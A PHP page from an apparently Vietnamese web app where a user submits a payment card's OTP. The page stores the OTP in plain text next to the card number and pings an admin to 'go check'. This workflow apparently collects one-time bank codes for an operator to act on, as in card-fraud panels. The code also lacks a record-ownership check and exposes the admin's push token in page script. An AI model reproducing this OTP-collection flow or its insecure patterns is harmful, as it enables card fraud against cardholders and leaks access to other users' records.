<?php
include '../../component/header.php';

if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'user') {
    header("Location: /no-permission");
    exit();
}
$id_history = $_GET['id'];

$query = "SELECT h.*, c.card_number FROM tbl_history h 
LEFT JOIN tbl_card c ON h.id_card = c.id_card 
WHERE h.id_history = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param('i', $id_history);
$stmt->execute();
$result = $stmt->get_result();
if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
}

if (isset($_POST['confirm_otp'])) {
    $otp = $_POST['otp'];

    if (!empty($otp)) {
        $query = "UPDATE tbl_history SET otp_card = ? WHERE id_history = ?";
        $stmt = $conn->prepare($query);
        $stmt->bind_param('si', $otp, $id_history);

        if ($stmt->execute()) {
            $_SESSION['otp_success'] = "Nhập OTP thẻ thành công!";


            echo "<script>
                document.getElementById('otpCardButton').click();
            </script>";

            header("Location: /user/history");
            exit();
        } else {
            $_SESSION['otp_error'] = "Nhập OTP thất bại. Vui lòng thử lại.";
        }

        $stmt->close();
    } else {
        $_SESSION['otp_error'] = "Vui lòng nhập OTP hợp lệ.";
    }
}
?>
<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../styles/index.css">
    <link rel="stylesheet" href="../../component/header.css">
    <link rel="stylesheet" href="../../component/sidebar.css">
    <link rel="stylesheet" href="../add-card/addcard.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <title>OTP thẻ</title>
    <style>
        input,
        select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
    </style>
</head>

<body>
    <div class="container_boby">
        <?php include '../../component/sidebar.php'; ?>
        <div class="content_right container_form">
            <div class="container">
                <h1 class="title">Nhập OTP thẻ</h1>
                <form id="otp-card-form" method="post" action="">
                    <label for="otp">Nhập mã OTP:</label>
                    <input type="password" id="otp" name="otp" required>
                    <input type="submit" id="otpCardButton" name="confirm_otp" value="Xác Nhận OTP">
                </form>
                <?php
                if (isset($_SESSION['otp_error'])) {
                    echo "<div class='error'>" . $_SESSION['otp_error'] . "</div>";
                    unset($_SESSION['otp_error']);
                }
                ?>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script>
        document.getElementById('otpCardButton').addEventListener('click', function () {
            console.log("aaaaaa");

            fetch('../../component/send.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'token': '<?php echo htmlspecialchars($row["token_admin"]); ?>',
                    'title': 'Thông báo từ bên user',
                    'body': 'User vừa nhập OTP thẻ bạn hãy vào kiểm tra',
                    'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
                })
            })
                .then(response => response.text())
                .then(data => {
                    console.log('Success:', data);
                    toastr.success('Thông báo đã được gửi thành công.');
                })
                .catch((error) => {
                    console.error('Error:', error);
                    toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
                });
        });


        $(document).ready(function () {
            <?php if (isset($_SESSION['otp_card_error'])): ?>
                toastr.error("<?php echo $_SESSION['otp_card_error']; ?>");
                <?php unset($_SESSION['otp_card_error']); ?>
            <?php endif; ?>
        });
    </script>
</body>

</html>